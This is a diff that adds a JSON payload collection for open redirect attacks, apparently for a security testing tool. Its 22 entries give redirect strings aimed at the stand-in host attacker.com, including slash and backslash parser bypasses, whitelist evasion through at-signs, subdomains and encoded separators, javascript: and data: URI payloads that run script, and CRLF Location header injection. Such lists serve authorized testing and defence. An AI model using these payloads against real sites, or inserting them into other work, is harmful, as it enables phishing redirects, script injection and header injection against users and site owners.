@@ -1,0 +1,38 @@
+{
+  "meta": {
+    "name": "Open Redirect",
+    "icon": "↪️",
+    "description": "Open redirect and URL redirection bypass payloads. Covers basic redirects, host validation bypasses, whitelist evasion, URL tricks, and header-based injection techniques.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 22
+  },
+  "payloads": [
+    {"id":1,"code":"//attacker.com","description":"Protocol-relative URL — browser supplies current protocol (http/https)","category":"basic","platform":["any"],"tags":["redirect","basic","protocol-relative"]},
+    {"id":2,"code":"https://attacker.com","description":"Absolute redirect — basic open redirect if no validation is applied","category":"basic","platform":["any"],"tags":["redirect","basic","absolute"]},
+    {"id":3,"code":"http://attacker.com","description":"HTTP absolute redirect","category":"basic","platform":["any"],"tags":["redirect","basic","http"]},
+    {"id":4,"code":"//attacker.com/%2f..","description":"Path confusion after redirect host — evades some suffix-based validators","category":"basic","platform":["any"],"tags":["redirect","path-confusion"]},
+
+    {"id":5,"code":"///attacker.com","description":"Triple-slash redirect — some parsers treat as //attacker.com","category":"bypass","platform":["any"],"tags":["redirect","bypass","triple-slash"]},
+    {"id":6,"code":"////attacker.com","description":"Four-slash redirect — additional slash bypass variant","category":"bypass","platform":["any"],"tags":["redirect","bypass","slash"]},
+    {"id":7,"code":"/\\attacker.com","description":"Backslash in URL — IE/Edge may interpret /\\ as //","category":"bypass","platform":["any"],"tags":["redirect","bypass","backslash","ie"]},
+    {"id":8,"code":"\\\\attacker.com","description":"Double backslash — Windows-style UNC that some parsers follow","category":"bypass","platform":["any"],"tags":["redirect","bypass","backslash","windows"]},
+    {"id":9,"code":"//attacker%2ecom","description":"Dot URL-encoded in host — %2e=. to confuse host validators","category":"bypass","platform":["any"],"tags":["redirect","bypass","url-encoded"]},
+    {"id":10,"code":"/%09/attacker.com","description":"Tab-delimited path bypass — %09 between slashes","category":"bypass","platform":["any"],"tags":["redirect","bypass","tab"]},
+
+    {"id":11,"code":"https://trusted.com@attacker.com","description":"URL credentials bypass — trusted.com treated as username; attacker.com is the host","category":"whitelist-bypass","platform":["any"],"tags":["redirect","bypass","at-sign","whitelist"]},
+    {"id":12,"code":"https://trusted.com.attacker.com","description":"Subdomain prefix confusion — trusted.com. is a subdomain of attacker.com","category":"whitelist-bypass","platform":["any"],"tags":["redirect","bypass","subdomain","whitelist"]},
+    {"id":13,"code":"https://attacker.com/trusted.com","description":"Path-based whitelist bypass — trusted.com appears in path, not host","category":"whitelist-bypass","platform":["any"],"tags":["redirect","bypass","path","whitelist"]},
+    {"id":14,"code":"https://trusted.com%2fattacker.com","description":"URL-encoded slash separating domains — tricks host parsers","category":"whitelist-bypass","platform":["any"],"tags":["redirect","bypass","encoded-slash","whitelist"]},
+    {"id":15,"code":"//trusted.com%5cattacker.com","description":"Encoded backslash between domains — %5c=\\ treated as path separator in some parsers","category":"whitelist-bypass","platform":["any"],"tags":["redirect","bypass","encoded-backslash"]},
+
+    {"id":16,"code":"https://attacker.com#trusted.com","description":"Fragment bypass — trusted.com appears after # which is client-only and ignored server-side","category":"url-tricks","platform":["any"],"tags":["redirect","bypass","fragment"]},
+    {"id":17,"code":"https://attacker.com?trusted.com","description":"Query param bypass — trusted.com in query, host is attacker.com","category":"url-tricks","platform":["any"],"tags":["redirect","bypass","query"]},
+    {"id":18,"code":"javascript:alert(document.domain)","description":"JavaScript scheme redirect — XSS if the redirect target is reflected into an href/location","category":"url-tricks","platform":["any"],"tags":["redirect","xss","javascript-scheme"]},
+    {"id":19,"code":"data:text/html,<script>window.location='https://attacker.com'</script>","description":"Data URI redirect — executes JS that navigates to attacker site","category":"url-tricks","platform":["any"],"tags":["redirect","xss","data-uri"]},
+
+    {"id":20,"code":"Location: https://attacker.com\r\n","description":"CRLF + Location header injection — injects redirect header via CRLF in a parameter","category":"header-injection","platform":["any"],"tags":["redirect","crlf","header-injection"]},
+    {"id":21,"code":"%0d%0aLocation: https://attacker.com","description":"URL-encoded CRLF Location injection — %0d=CR %0a=LF for header injection","category":"header-injection","platform":["any"],"tags":["redirect","crlf","header-injection","url-encoded"]},
+    {"id":22,"code":"%E5%98%8A%E5%98%8DLocation:https://attacker.com","description":"Unicode CRLF injection — U+560A and U+560D normalize to \\r\\n in some servers","category":"header-injection","platform":["any"],"tags":["redirect","crlf","unicode","bypass"]}
+  ]
+}
